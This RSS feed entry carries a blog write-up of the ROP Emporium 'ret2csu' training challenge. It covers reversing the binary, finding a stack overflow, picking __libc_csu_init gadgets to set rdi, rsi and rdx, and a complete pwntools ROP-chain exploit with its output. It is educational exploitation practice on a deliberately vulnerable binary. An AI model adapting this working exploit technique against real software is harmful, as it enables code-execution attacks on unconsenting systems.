<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>rop on Anvbis</title><link>https://anvbis.github.io/tags/rop/</link><description>Recent content in rop on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Thu, 12 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/rop/index.xml" rel="self" type="application/rss+xml"/><item><title>ROP Emporium :: Ret2csu</title><link>https://anvbis.github.io/posts/rop-emporium-ret2csu/</link><pubDate>Thu, 12 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/rop-emporium-ret2csu/</guid><description>Reverse Engineering Let&amp;rsquo;s run the file command to get a brief overview of the binary. Note that it is a 64-bit linux executable.
$ file ./ret2csu ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped We can also run checksec against the target. This reveals a little more information, we can see that there is no stack canary, so there&amp;rsquo;s no need to bypass that protection.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Let&amp;rsquo;s run the &lt;code>file&lt;/code> command to get a brief overview of the binary. Note that it is a 64-bit linux executable.&lt;/p>
&lt;pre>&lt;code>$ file ./ret2csu
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped
&lt;/code>&lt;/pre>&lt;p>We can also run &lt;code>checksec&lt;/code> against the target. This reveals a little more information, we can see that there is no stack canary, so there&amp;rsquo;s no need to bypass that protection. We can also see that the NX bit is enabled, so we can&amp;rsquo;t execute shellcode.&lt;/p>
&lt;pre>&lt;code>$ checksec ./ret2csu
[*] './ret2csu'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
RUNPATH: b'.'
&lt;/code>&lt;/pre>&lt;p>Running the executable shows us that it at some point takes user input. This is likely where we&amp;rsquo;ll be able to find some vulnerability.&lt;/p>
&lt;pre>&lt;code>$ ./ret2csu
ret2csu by ROP Emporium
x86_64
Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.
&amp;gt; hello
Thank you!
&lt;/code>&lt;/pre>&lt;p>After a tiny bit of reverse engineering, we see this &lt;code>pwnme&lt;/code> function called by &lt;code>main&lt;/code>. We can see that it allocates 0x20 bytes of memory for a buffer &lt;code>buf&lt;/code>, before reading in 0x200 bytes from stdin and storing it in the buffer - here is our overflow.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">pwnme&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf;
setvbuf(&lt;span style="color:#f92672">*&lt;/span>_reloc.stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xc88&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xca0&lt;/span>);
memset(&lt;span style="color:#f92672">&amp;amp;&lt;/span>buf, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x20&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xca8&lt;/span>);
printf(&lt;span style="color:#ae81ff">0xd12&lt;/span>);
read(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buf, &lt;span style="color:#ae81ff">0x200&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xd15&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Further investigation reveals that there is a function called &lt;code>ret2win&lt;/code>. Another function &lt;code>usefulFunction&lt;/code> appears to call &lt;code>ret2win&lt;/code> with the parameters &lt;code>ret2win(0x3, 0x2, 0x1)&lt;/code>. We&amp;rsquo;ll want to investigate this function further.&lt;/p>
&lt;pre>&lt;code>0x00400510 1 6 sym.imp.ret2win
&lt;/code>&lt;/pre>&lt;pre>&lt;code>0x000000000040061b &amp;lt;+4&amp;gt;: mov edx,0x3
0x0000000000400620 &amp;lt;+9&amp;gt;: mov esi,0x2
0x0000000000400625 &amp;lt;+14&amp;gt;: mov edi,0x1
0x000000000040062a &amp;lt;+19&amp;gt;: call 0x400510 &amp;lt;ret2win@plt&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Reversing the &lt;code>ret2win&lt;/code> function reveals that it will immediately call &lt;code>exit&lt;/code> if the correct parameters are not provided. If the correct parameters are provided, however, the binary will decrypt and print the flag stored in &lt;code>encrypted_flag.dat&lt;/code>.&lt;/p>
&lt;p>The correct parameters are as follows:&lt;/p>
&lt;ul>
&lt;li>&lt;code>$rdi = 0xdeadbeefdeadbeef&lt;/code>.&lt;/li>
&lt;li>&lt;code>$rsi = 0xcafebabecafebabe&lt;/code>.&lt;/li>
&lt;li>&lt;code>$rdx = 0xd00df00dd00df00d&lt;/code>.&lt;/li>
&lt;/ul>
&lt;p>So we have to find some way to set all of these registers to their correct values before calling the &lt;code>ret2win&lt;/code> function in order to get the flag.&lt;/p>
&lt;pre>&lt;code> 0x000009ef 48b8efbeadde. movabs rax, 0xdeadbeefdeadbeef
0x000009f9 483945e8 cmp qword [var_18h], rax
┌─&amp;lt; 0x000009fd 0f85d7000000 jne 0xada
│ 0x00000a03 48b8bebafeca. movabs rax, 0xcafebabecafebabe
│ 0x00000a0d 483945e0 cmp qword [var_20h], rax
┌──&amp;lt; 0x00000a11 0f85c3000000 jne 0xada
││ 0x00000a17 48b80df00dd0. movabs rax, 0xd00df00dd00df00d
││ 0x00000a21 483945d8 cmp qword [var_28h], rax
┌───&amp;lt; 0x00000a25 0f85af000000 jne 0xada
│││ 0x00000a2b 488d35ee0200. lea rsi, [0x00000d20]
│││ 0x00000a32 488d3de90200. lea rdi, str.encrypted_flag.dat
│││ 0x00000a39 e8f2fdffff call sym.imp.fopen
...
│││
└└└─&amp;gt; 0x00000ada 488d3d930200. lea rdi, str.Incorrect_parameters
0x00000ae1 e8bafcffff call sym.imp.puts ; int puts(const char *s)
0x00000ae6 bf01000000 mov edi, 1 ; int status
0x00000aeb e850fdffff call sym.imp.exit ; void exit(int status)
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>First, let&amp;rsquo;s find the offset of the return address from where our input buffer is stored in the &lt;code>pwnme&lt;/code> function.&lt;/p>
&lt;p>We&amp;rsquo;ll use a small script to attach the process to GDB and store a cyclic pattern of bytes in our input buffer. This will allow us to calculate the offset from the start of our input buffer to the return address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./ret2csu&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">200&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can continue within GDB, and print the value at the top of the stack to get the value stored in the return pointer.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/gx $rsp
0x7ffe9d7c4538: 0x6161616161616166
&lt;/code>&lt;/pre>&lt;p>Using pwntools' &lt;code>cyclic_find&lt;/code> function we can get the offset from the start of our input buffer to the return address stored on the stack.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616166&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">40&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next let&amp;rsquo;s figure out how we can store a value in the &lt;code>$rdx&lt;/code> register. We&amp;rsquo;re able to store values in the &lt;code>$rdi&lt;/code> and &lt;code>$rsi&lt;/code> registers quite easily (they have &lt;code>pop; ret&lt;/code> gadgets we can easily use).&lt;/p>
&lt;p>After digging around the &lt;code>__libc_csu_init&lt;/code> function, we find two interesting looking gadgets, see below (I&amp;rsquo;ve added some comments for clarity).&lt;/p>
&lt;p>Note that we can use the first gadget to set the values of &lt;code>$rsi&lt;/code> and &lt;code>$rdx&lt;/code>.&lt;/p>
&lt;pre>&lt;code>0x00400680 4c89fa mov rdx, r15
0x00400683 4c89f6 mov rsi, r14
0x00400686 4489ef mov edi, r13d
0x00400689 41ff14dc call qword [r12 + rbx*8]
0x0040068d 4883c301 add rbx, 1
0x00400691 4839dd cmp rbp, rbx
0x00400694 75ea jne 0x400680
&lt;/code>&lt;/pre>&lt;pre>&lt;code>0x0040069a 5b pop rbx ; set to 0
0x0040069b 5d pop rbp ; set to 1 to bypass check after call
0x0040069c 415c pop r12 ; set to pointer to useless function
0x0040069e 415d pop r13
0x004006a0 415e pop r14 ; set to 0xcafebabecafebabe to store in $rsi
0x004006a2 415f pop r15 ; set to 0xd00df00dd00df00d to store in $rdx
0x004006a4 c3 ret
&lt;/code>&lt;/pre>&lt;p>It&amp;rsquo;ll be a little complex, but we should be able to use these to get the values we want into our target registers.&lt;/p>
&lt;p>We can use the second gadget to set up for the first gadget (so we can move the correct values into our target registers).&lt;/p>
&lt;p>Note the &lt;code>call qword [r12 + rbx*8]&lt;/code> instruction. As it dereferences a pointer to a function, we can&amp;rsquo;t use this to redirect execution.&lt;/p>
&lt;pre>&lt;code>0x00400686 4489ef mov edi, r13d
0x00400689 41ff14dc call qword [r12 + rbx*8]
0x0040068d 4883c301 add rbx, 1
&lt;/code>&lt;/pre>&lt;p>Instead we&amp;rsquo;ll have to find a pointer to some function that doesn&amp;rsquo;t change anything, as to not ruin the values stored in our target registers. We&amp;rsquo;ll just pass by this call and head to the &lt;code>ret&lt;/code> instruction below.&lt;/p>
&lt;p>Let&amp;rsquo;s take a look at the functions stored in the binary, and see if we can find any pointers to them.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; info functions
All defined functions:
Non-debugging symbols:
0x00000000004004d0 _init
0x0000000000400500 pwnme@plt
0x0000000000400510 ret2win@plt
0x0000000000400520 _start
0x0000000000400550 _dl_relocate_static_pie
0x0000000000400560 deregister_tm_clones
0x0000000000400590 register_tm_clones
0x00000000004005d0 __do_global_dtors_aux
0x0000000000400600 frame_dummy
0x0000000000400607 main
0x0000000000400617 usefulFunction
0x0000000000400640 __libc_csu_init
0x00000000004006b0 __libc_csu_fini
0x00000000004006b4 _fini
&lt;/code>&lt;/pre>&lt;p>Using &lt;code>objdump&lt;/code> and &lt;code>grep&lt;/code> we can look for the first couple bytes of each function, and see if they show up anywhere in the disassembly.&lt;/p>
&lt;p>The address that immediately jumps out to me is &lt;code>0x4003af&lt;/code>, which contains the bytes for the &lt;code>_fini&lt;/code> function, a suitably inert function.&lt;/p>
&lt;pre>&lt;code>$ objdump -D ret2csu | grep '06 40' -B 1
4003ad: 00 0e add %cl,(%rsi)
4003af: 00 b4 06 40 00 00 00 add %dh,0x40(%rsi,%rax,1)
--
40052e: 54 push %rsp
40052f: 49 c7 c0 b0 06 40 00 mov $0x4006b0,%r8
400536: 48 c7 c1 40 06 40 00 mov $0x400640,%rcx
40053d: 48 c7 c7 07 06 40 00 mov $0x400607,%rdi
--
600e45: 00 00 add %al,(%rax)
600e47: 00 b4 06 40 00 00 00 add %dh,0x40(%rsi,%rax,1)
&lt;/code>&lt;/pre>&lt;p>We can look this up in GDB to be sure (adding 1 to align the address correctly).&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/x (0x4003af + 1)
0x4003b0: 0x00000000004006b4
&lt;/code>&lt;/pre>&lt;p>Now we can use the &lt;code>ropper&lt;/code> tool to find a gadget to set the value of &lt;code>$rdi&lt;/code>. Surprise, surprise, we immediately find one.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./ret2csu --search '% rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % rdi
[INFO] File: ./ret2csu
0x00000000004006a3: pop rdi; ret;
&lt;/code>&lt;/pre>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>We have all the information we need, so let&amp;rsquo;s start building our exploit. Here&amp;rsquo;s an outline of what we want to achieve:&lt;/p>
&lt;ul>
&lt;li>Overwrite the return address in the &lt;code>pwnme&lt;/code> function.&lt;/li>
&lt;li>Store the values &lt;code>0xcafebabecafebabe&lt;/code> and &lt;code>0xd00df00dd00df00d&lt;/code> in the &lt;code>$rsi&lt;/code> and &lt;code>$rdx&lt;/code> registers.&lt;/li>
&lt;li>Store the value &lt;code>0xdeadbeefdeadbeef&lt;/code> in the &lt;code>$rdi&lt;/code> register.&lt;/li>
&lt;li>Call the &lt;code>ret2win&lt;/code> function with the above values.&lt;/li>
&lt;/ul>
&lt;p>Note: we have to be pretty careful when using the gadgets we found in the csu function, in order to pass the check after the call, we have to set the values &lt;code>$rbp = 1&lt;/code> and &lt;code>$rbx = 0&lt;/code>.&lt;/p>
&lt;p>We also have to pad out the stack so that the &lt;code>pop&lt;/code> instructions after the call don&amp;rsquo;t destroy our rop chain.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">pop rbx ; 0
&lt;/span>&lt;span style="color:#e6db74">pop rbp ; 1
&lt;/span>&lt;span style="color:#e6db74">pop r12 ; 0x4003af+1
&lt;/span>&lt;span style="color:#e6db74">pop r13
&lt;/span>&lt;span style="color:#e6db74">pop r14 ; 0xcafebabecafebabe
&lt;/span>&lt;span style="color:#e6db74">pop r15 ; 0xd00df00dd00df00d
&lt;/span>&lt;span style="color:#e6db74">ret ; ret2csu_rdx
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
ret2csu_set &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00400680&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">mov rdx, r15
&lt;/span>&lt;span style="color:#e6db74">mov rsi, r14
&lt;/span>&lt;span style="color:#e6db74">mov edi, r13d
&lt;/span>&lt;span style="color:#e6db74">call qword [r12 + rbx*8]
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
ret2csu_rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0040069a&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">pop rdi ; 0xdeadbeefdeadbeef
&lt;/span>&lt;span style="color:#e6db74">ret ; ret2win
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x004006a3&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">jmp qword [reloc.ret2win]
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
ret2win &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00400510&lt;/span>
elf &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./ret2csu&amp;#39;&lt;/span>)
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
&lt;span style="color:#75715e"># ret2csu_set&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(ret2csu_rdx)
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop rbx&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#75715e"># pop rbp&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0x4003af&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#75715e"># pop r12&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r13&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0xcafebabecafebabe&lt;/span>) &lt;span style="color:#75715e"># pop r14&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0xd00df00dd00df00d&lt;/span>) &lt;span style="color:#75715e"># pop r15&lt;/span>
&lt;span style="color:#75715e"># ret2csu_rdx&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(ret2csu_set)
&lt;span style="color:#75715e"># pop_rdi&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># stack alignment&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop rbx&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop rbp&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r12&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r13&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r14&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r15&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(pop_rdi)
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>) &lt;span style="color:#75715e"># pop rdi&lt;/span>
&lt;span style="color:#75715e"># ret2win&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(ret2win)
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./ret2csu&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span> &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
r&lt;span style="color:#f92672">.&lt;/span>readline()
log&lt;span style="color:#f92672">.&lt;/span>success(&lt;span style="color:#e6db74">&amp;#39;Flag: &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readline()&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>))
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action.&lt;/p>
&lt;pre>&lt;code>./exploit.py
[*] './ret2csu'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
RUNPATH: b'.'
[*] Loaded 13 cached gadgets for './ret2csu'
[+] Starting local process './ret2csu': pid 1110
[+] Flag: ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2csu' stopped with exit code 0 (pid 1110)
&lt;/code>&lt;/pre></content></item></channel></rss>